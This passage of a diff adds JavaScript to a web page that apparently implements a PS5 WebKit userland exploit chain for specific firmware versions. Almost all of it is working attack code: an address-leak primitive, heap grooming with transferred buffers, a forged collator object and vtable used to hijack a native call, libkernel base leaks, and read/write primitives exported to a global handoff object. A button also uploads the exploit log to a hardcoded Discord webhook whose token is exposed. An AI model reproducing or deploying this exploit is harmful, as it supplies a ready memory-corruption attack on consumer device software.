+        mark("MODULE-IMPORT-LEAK-PASS", "windows-read-twice=true-provider-crosschecks=true");
+      } else {
+        mark("MODULE-IMPORT-LEAK-MISMATCH", `rw=${rwHeaderOK}-function=${functionHeaderOK}`
+          + `-native=${nativeExecutableHeaderOK}-base=${webkitBaseOK}-repeat=${pointersRepeated}`
+          + `-got=${gotReadOK}-libkernel-candidate=${kernelBaseOK}-restore=${restoreObserved}`);
+      }
+      mark("ROOTS-LIVE", `rw-mirror=${rwMirror[0].toString(16)}`
+        + `-guard-byte=${targetView[0].toString(16)}`
+        + `-parseInt-type=${typeof nativeTarget}-length-word=${lengthWord.keep.toString(16)}`);
+      if (leakPass && notifyReady && carrierArmedForCommit && commitBlockConfirmed) {
+        mark("NOTIFY-PLAN-PASS", `arena-filled=${arenaFilledOK}-carrier-parked=true`);
+        mark("NONFATAL-NATIVE-CALL-NEXT", "system-notification-via-natural-stack");
+        setTimeout(commitNotificationProof, 1500);
+        return;
+      }
+      mark("NOTIFY-PLAN-MISMATCH", `ready=${notifyReady}-arena=${arenaLayoutOK}`
+        + `-filled=${arenaFilledOK}-collator=${collatorHeaderOK}`
+        + `-compare=${compareFnHeaderOK}-request=${notificationRequestOK}`
+        + `-target=${notifyAddressOK}-carrier-armed=${carrierArmedForCommit}`
+        + `-repeat-block=${commitBlockConfirmed}`);
+      failed();
+      setTimeout(() => { mark("SURVIVED-NO-COMMIT-T1000"); }, 1000);
+    }
+
+    function commitNotificationProof() {
+      mark("NOTIFY-COMMIT-TIMER-FIRED", `attempt=${attemptNumber}`);
+      if (!NOTIFY_TARGET_VERIFIED) {
+        mark("COMMIT-ABORT", `notify-target-unverified-fw=${FW_LABEL}`);
+        failed(); return;
+      }
+      if (!notifyReady || !carrierArmedForCommit || !commitBlockConfirmed || commitStarted) {
+        mark("COMMIT-ABORT", "state-changed-before-commit"); failed(); return;
+      }
+      for (let before = 0; before < collatorOriginal.length; ++before) {
+        if (rwView[before] !== collatorOriginal[before]) {
+          mark("COMMIT-ABORT", "collator-bytes-changed-before-commit"); failed(); return;
+        }
+      }
+      if (rwView[0x1b] !== 0) { mark("COMMIT-ABORT", "ascii-tristate-no-longer-false"); failed(); return; }
+      if (!notificationRequestOK || notificationRequest.length !== NOTIFICATION_REQUEST_SIZE) {
+        mark("COMMIT-ABORT", "notification-request-changed-before-commit"); failed(); return;
+      }
+      commitStarted = true;
+      try {
+        getterCarrier = null; leakedScope = null; preparedSymbolObject = null;
+        capturedString = null; capturedWords = null;
+      } catch (e) {}
+      mark("NOTIFY-ROOTS-DROPPED", "gc-pressure-allocation=disabled");
+      const fakeHigh = Math.floor(fakeUCollatorAddress / 0x100000000);
+      scratchWords[0] = fakeUCollatorAddress - fakeHigh * 0x100000000;
+      scratchWords[1] = fakeHigh;
+      let notifyResult = 0;
+      let callError = null;
+      for (let cb = 0; cb < 8; ++cb) rwView[cb] = scratchBytes[cb];
+      mark("NOTIFY-CALL-ENTER", "system-notification");
+      try {
+        notifyResult = compareFn(notificationRequest, "b");
+        mark("NOTIFY-CALL-RETURN", `result=${notifyResult}`);
+      } catch (error) { callError = error; }
+      for (let rb = 0; rb < collatorOriginal.length; ++rb) rwView[rb] = collatorOriginal[rb];
+      let collatorRestored = true;
+      for (let vr = 0; vr < collatorOriginal.length; ++vr)
+        if (rwView[vr] !== collatorOriginal[vr]) collatorRestored = false;
+      const handoff = {
+        aim: function (addr) {
+          if (carrierCandidate === null) throw new Error("carrier-lost");
+          aimCarrier(carrierCandidate, addr);
+          return rwView;
+        },
+        view: function () { return rwView; },
+        arena: arenaView, arenaBacking: arenaBacking, arenaBytes: ARENA_BYTES,
+        fakeCollator: fakeUCollatorAddress, fakeVtable: fakeVtableAddress,
+        collatorCell: realCollatorAddress, collatorSaved: collatorOriginal,
+        compare: function (s) { return compareFn(s, "b"); },
+        requestPadded: function (message) {
+          const off = NOTIFICATION_MESSAGE_OFFSET, cap = NOTIFICATION_REQUEST_SIZE;
+          let m = String(message), cut = cap - off - 1;
+          if (m.length > cut) m = m.slice(0, cut);
+          let s = "";
+          for (let i = 0; i < off; ++i) s += "\x00";
+          for (let i = 0; i < cap; ++i) {
+            const c = i < off ? 0 : (i < off + m.length
+              ? (m.charCodeAt(i - off) & 0x7f) : 0);
+            s += String.fromCharCode(c);
+          }
+          return s;
+        },
+        webkitBase: webkitBase, libkernelBase: kernelBase,
+        kernelBaseCandidates: {
+          getpid: getpidPointer ? getpidPointer - P_GETPID_EXP : 0,
+          close: closePointer ? closePointer - P_CLOSE_EXP : 0,
+          error: errorPointer ? errorPointer - P_ERROR_EXP : 0,
+          getpidPtr: getpidPointer, closePtr: closePointer, errorPtr: errorPointer
+        },
+        notifyEntry: notifyEntryAddress, trampoline: naturalTrampolineAddress,
+        fw: FW_LABEL
+      };
+      window.__PS5_CTX = handoff;
+      const notifyReturned = !callError && collatorRestored
+        && Number.isFinite(notifyResult) && Math.floor(notifyResult) === notifyResult;
+      const notificationSent = notifyReturned && notifyResult === 0;
+      let passPersisted = false;
+      if (notificationSent) {
+        try { sessionStorage.setItem(passKey, "1");
+              passPersisted = sessionStorage.getItem(passKey) === "1"; } catch {}
+      }
+      if (notificationSent && passPersisted) {
+        mark("NOTIFY-NATIVE-CALL-PASS", "result=0-collator-restored=true-permanent-block=true");
+        succeeded(`result=0 attempt=${attemptNumber}`);
+      } else if (callError) {
+        mark("NOTIFY-CALL-THREW", `${callError?.name}:${String(callError?.message).slice(0, 80)}`
+          + `-collator-restored=${collatorRestored}`);
+        failed();
+      } else if (notificationSent) {
+        mark("NOTIFY-PASS-STORAGE-FAIL", "result=0-collator-restored=true");
+        succeeded(`result=0 attempt=${attemptNumber}`);
+      } else if (notifyReturned) {
+        const notifyResultU32 = notifyResult < 0 ? notifyResult + 0x100000000 : notifyResult;
+        mark("NOTIFY-NATIVE-CALL-RETURN", `error=${hex(notifyResultU32)}-signed=${notifyResult}`
+          + "-collator-restored=true");
+        failed();
+      } else {
+        mark("NOTIFY-RETURN-MISMATCH", `result=${notifyResult}-collator-restored=${collatorRestored}`);
+        failed();
+      }
+      try {
+        keepAlive = null; predecessorWords = null;
+        outerGraph = null; fillerGraph = null; referenceTarget = null;
+        if (typeof globalThis.gc === "function") globalThis.gc();
+      } catch (e) {}
+      if (notifyReturned && collatorRestored
+          && typeof globalThis.onUserland === "function") {
+        try { globalThis.onUserland(); }
+        catch (e) { mark("BRIDGE-BOOT-THREW", String(e && e.message || e).slice(0, 80)); }
+      }
+      setTimeout(() => { mark("SURVIVED-NOTIFY-T1000"); }, 1000);
+    }
+
+    function runGroomAndLoad() {
+      let stage = "message-channel-create";
+      try {
+        mark("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
+        const channel = new MessageChannel();
+        channel.port1.close(); channel.port2.close();
+        stage = "drain-buffer-allocate";
+        for (let i = 0; i < DRAIN_COUNT; ++i) keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
+        stage = "slab-transfer";
+        let slab = buffer(SLAB_SIZE);
+        channel.port1.postMessage(0, [slab]); slab = null;
+        stage = "placement-buffer-allocate";
+        const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
+        const butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
+        const separator = buffer(SEPARATOR_SIZE);
+        const earlyHole = buffer(EARLY_HOLE_SIZE);
+        const guard = buffer(GUARD_SIZE);
+        const predecessor = buffer(PREDECESSOR_SIZE);
+        const finalHole = buffer(FINAL_HOLE_SIZE);
+        stage = "predecessor-fill";
+        fillRawCellPointers(predecessor, fakeAddress);
+        keepAlive[keepIndex++] = separator;
+        keepAlive[keepIndex++] = guard;
+        keepAlive[keepIndex++] = predecessor;
+        mark("PREDECESSOR-FILLED", `qwords=${PREDECESSOR_SIZE / 8}-fake=${hex(fakeAddress)}`);
+        stage = "placement-buffer-transfer";
+        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
+        stage = "history-state-deserialize";
+        loadHistoryCritical();
+      } catch (error) {
+        try { clearPredecessor(); } catch {}
+        compositionStage = stage; retrySafe = true;
+        compositionError = error; compositionState = -1;
+      }
+      reportComposition();
+    }
+
+    function beginComposition() {
+      if (captureState === 0) {
+        finishEarlySafeAttempt("ADDROF-NO-RESULT", "capture-task-did-not-finish", "addrof-no-result");
+        return;
+      }
+      if (captureState < 0) {
+        finishEarlySafeAttempt("ADDROF-THREW",
+          `${captureError?.name}:${String(captureError?.message).slice(0, 80)}`, "addrof-threw");
+        return;
+      }
+      const a0 = pointerFromWords(capturedWords, 0);
+      const b0 = pointerFromWords(capturedWords, 4);
+      const a1 = pointerFromWords(capturedWords, 8);
+      const b1 = pointerFromWords(capturedWords, 12);
+      const repeated = a0 === a1 && b0 === b1;
+      const distinct = a0 !== b0;
+      const plausible = plausibleCell(a0) && plausibleCell(b0)
+        && plausibleCell(a1) && plausibleCell(b1);
+      const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
+      const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
+      mark("ADDROF-RETURNED", REVISION);
+      mark("ADDROF-COPY", `chars=${copiedLength}-source-covered=${sourceCovered}`);
+      mark("ADDROF-POINTERS", `HOST=${hex(a0)}-TARGET=${hex(b0)}-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`);
+      if (!(repeated && distinct && plausible && sourceCovered)) {
+        finishEarlySafeAttempt("ADDROF-FAIL",
+          `repeat=${repeated}-distinct=${distinct}-plausible=${plausible}-covered=${sourceCovered}`,
+          "addrof-validation");
+        return;
+      }
+      hostAddress = a0; targetAddress = b0;
+      targetAddressHigh = Math.floor(targetAddress / 0x100000000);
+      targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
+      if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
+          || targetAddressLow < 0 || targetAddressLow > 0xffffffff
+          || Math.floor(targetAddressLow) !== targetAddressLow
+          || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
+        finishEarlySafeAttempt("TARGET-ADDRESS-FAIL", `target=${hex(targetAddress)}`, "target-address");
+        return;
+      }
+      fakeAddress = hostAddress + 0x10;
+      if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
+        finishEarlySafeAttempt("FAKE-ADDRESS-FAIL", `host=${hex(hostAddress)}`, "fake-address");
+        return;
+      }
+      mark("FAKE-ADDRESS", `host=${hex(hostAddress)}-fake=${hex(fakeAddress)}-delta=0x10`);
+      runGroomAndLoad();
+    }
+
+    function startAttempt() {
+      if (stopped) return;
+      resetAttemptState();
+      applyProfile(profileAttempt++);
+      statusText(`Running - attempt ${attemptNumber}`, "running");
+      try {
+        sessionStorage.setItem(attemptKey, String(attemptNumber));
+        attemptPersisted = sessionStorage.getItem(attemptKey) === String(attemptNumber);
+      } catch {}
+      mark("ATTEMPT-START", `attempt-persisted=${attemptPersisted}`
+        + `-auto=${autoMode}-hard-max=${MAX_ATTEMPTS || "none"}`
+        + `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`
+        + `-retry-ms=${AUTO_RETRY_DELAY_MS}`);
+      if (NPERFILS > 1)
+        mark("PROFILE", `idx=${perfilIndex}/${NPERFILS}-gps=${hex(P_GETPID_SLOT)}`
+          + `-gpe=${hex(P_GETPID_EXP)}-gd=${hex(P_GADGET)}-nt=${hex(P_NOTIFY)}`);
+      mark("DEVKIT-UNLOCK-STATUS", "available=false-reason=no-kernel-read-write-primitive");
+      mark("NOTIFY-FIRMWARE-GATE", `verified=${NOTIFY_TARGET_VERIFIED}`
+        + `-fw=${FW_LABEL}-ua=${USER_AGENT_FW}-accepted=11.60,13.60`);
+      const offsetReference = globalThis.PS5_KERNEL_OFFSET_REFERENCE;
+      const kernelDataProfile = offsetReference?.forFirmware(FW_LABEL);
+      if (kernelDataProfile) {
+        const mismatches = offsetReference.compareSupplied(FW_LABEL);
+        mark("KERNEL-DATA-OFFSETS", `source=sdk-v0.42-fw=${kernelDataProfile.firmware}`
+          + `-data=${hex(kernelDataProfile.dataFromText)}`
+          + `-allproc=${hex(kernelDataProfile.allprocFromText)}`
+          + `-security=${hex(kernelDataProfile.securityFlagsFromText)}`
+          + `-rootvnode=${hex(kernelDataProfile.rootvnodeFromText)}`
+          + `-bus=${hex(kernelDataProfile.busDataDevicesFromText)}`
+          + `-provided-mismatch=${mismatches.join(",") || "none"}-metadata-only=true`);
+      } else {
+        mark("KERNEL-DATA-OFFSETS", `fw=${FW_LABEL}-reference=unavailable-metadata-only=true`);
+      }
+      try {
+        buildAndStoreGraph();
+        prepareAddrof();
+      } catch (error) {
+        finishEarlySafeAttempt("SETUP-THREW",
+          `${error?.name}:${String(error?.message).slice(0, 80)}`, "setup-threw");
+      }
+    }
+
+    statusText("Initializing...", "running");
+    screenLine("BragaTy - PS5 WebKit userland - by wamphyre");
+    screenLine("(webkit POC base: mansoor0x - see NOTICE.md)");
+    screenLine("Target: FW " + FW_LABEL);
+    screenLine("");
+
+    try {
+      globalThis.__psaitoStop = function () {
+        stopped = true; retrySafe = false; retryScheduled = true;
+        try { sessionStorage.setItem(blockKey, "1"); } catch {}
+        statusText(`Stopped by user (attempt ${attemptNumber})`, "failed");
+        screenLine("");
+        screenLine(`STOPPED by user at attempt ${attemptNumber}`);
+        return true;
+      };
+      globalThis.__psaitoState = function () {
+        return { stopped, attempt: attemptNumber, mode: window.PS5 && window.PS5.mode };
+      };
+    } catch (e) {}
+
+    mark("BOOT", `rev=${REVISION}-k=${K}-n=${DRAIN_COUNT}`
+      + `-attempt=${attemptNumber}-armed=${armed}-loop=relentless`);
+
+    if (!armed) {
+      stopped = true;
+      statusText("Open with ?go=1 to start", "");
+      screenLine("Add ?go=1 to URL to run the exploit");
+    } else if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
+        || typeof Symbol !== "function" || typeof history === "undefined"
+        || typeof history.replaceState !== "function") {
+      mark("UNSUPPORTED");
+      statusText("Unsupported browser", "failed");
+    } else {
+      alreadyPassed = false; alreadyBlocked = false;
+      try {
+        sessionStorage.removeItem(passKey);
+        sessionStorage.removeItem(blockKey);
+      } catch {}
+      startAttempt();
+    }
+  })();
+
+  // -------------------------------------------------------------------
+  // UI wiring — top-of-page buttons
+  // -------------------------------------------------------------------
+  (function () {
+    const runExploit = document.getElementById("run-exploit");
+    const stopExploit = document.getElementById("stop-exploit");
+    const sendExploit = document.getElementById("send-exploit");
+    if (runExploit) runExploit.addEventListener("click", () => {
+      const u = new URL(location.href);
+      u.searchParams.set("go", "1");
+      if (!u.searchParams.has("log")) u.searchParams.set("log", "1");
+      location.href = u.toString();
+    });
+    if (stopExploit) stopExploit.addEventListener("click", () => {
+      try { if (typeof globalThis.__psaitoStop === "function") globalThis.__psaitoStop(); } catch (e) {}
+    });
+    if (sendExploit) sendExploit.addEventListener("click", async () => {
+      try {
+        if (typeof globalThis.__psaitoLog === "function") {
+          const text = globalThis.__psaitoLog();
+          if (text && text.trim()) {
+            const webhook = "https://discord.com/api/webhooks/1553463314422698085/tmWHGyzq7leGIFI1km9VbvnkVRsTexrL-JOsdPVoWoMR1AF7sfHVcx-zbf_DFbW2BEMj";
+            const form = new FormData();
+            form.append("payload_json", JSON.stringify({
+              content: "PS5 exploit log", allowed_mentions: { parse: [] }
+            }));
+            form.append("files[0]",
+              new Blob([text], { type: "text/plain;charset=utf-8" }),
+              "ps5-exploit-log.txt");
+            await fetch(webhook + "?wait=true", {
+              method: "POST", body: form, mode: "no-cors",
+              credentials: "omit", referrerPolicy: "no-referrer"
+            });
+          }
+        }
+      } catch (e) {}
+    });
+  })();
+})();
+</script>
 </body>
 </html>
